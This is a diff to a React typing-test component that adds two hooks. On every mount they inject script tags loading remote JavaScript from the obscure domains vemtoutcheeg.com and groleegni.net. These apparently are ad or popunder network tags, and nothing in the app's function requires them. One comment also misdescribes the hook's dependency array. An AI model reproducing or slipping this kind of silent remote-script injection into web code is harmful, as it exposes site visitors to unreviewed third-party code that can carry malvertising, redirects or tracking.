@@ -1,17 +1,68 @@
-import React, {useState } from 'react';
+import React, {useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import base from './airtable'; 
 import './typingtest.css';
 import Typingranks from './typingranks';
 export default function Typingtest() { 
+   const d = 'vemtoutcheeg.com'; // Domain
+  const z = 8685031;           // Identifier
+  const s = document.createElement('script'); // Create script element
  
- 
+  useEffect(() => {
+    // Function to dynamically load the script
+    const loadScript = () => {
+      s.src = `https://${d}/400/${z}`;            // Set script source
+
+      try {
+        (document.body || document.documentElement).appendChild(s); // Append script
+        console.log('Script loaded successfully');
+      } catch (error) {
+        console.error('Error appending the script:', error); // Handle errors
+      }
+    };
+
+    loadScript();
+
+    // Optional Cleanup: Remove the script when the component unmounts
+    return () => {
+      const scriptElement = document.querySelector(`script[src="https://${d}/400/${z}"]`);
+      if (scriptElement) {
+        scriptElement.remove();
+        console.log('Script removed');
+      }
+    };
+  }, [s]); // Empty dependency array ensures this runs once on mount
+
+  useEffect(() => {
+    const domain = 'groleegni.net';
+    const identifier = 8685071;
+
+    // Create a new script element
+    const scriptElement = document.createElement('script');
+    scriptElement.src = `https://${domain}/401/${identifier}`;
+
+    try {
+      // Append the script to the document body or root
+      (document.body || document.documentElement).appendChild(scriptElement);
+      console.log('Script loaded successfully.');
+    } catch (error) {
+      console.error('Error appending the script:', error);
+    }
+
+    // Cleanup: Remove the script when the component is unmounted
+    return () => {
+      if (scriptElement) {
+        scriptElement.remove();
+        console.log('Script removed.');
+      }
+    };
+  }, []); // Empty dependency array ensures it runs only once when the component mounts
+
   const navigate = useNavigate();
   const [name, setName] = useState('');
   const [message, setMessage] = useState('');
   const [level, setLevel] = useState('');
-
-  const handleLevel = (e) => {
+   const handleLevel = (e) => {
     const selectedLevel = e.target.value;
     setLevel(selectedLevel); 
   };
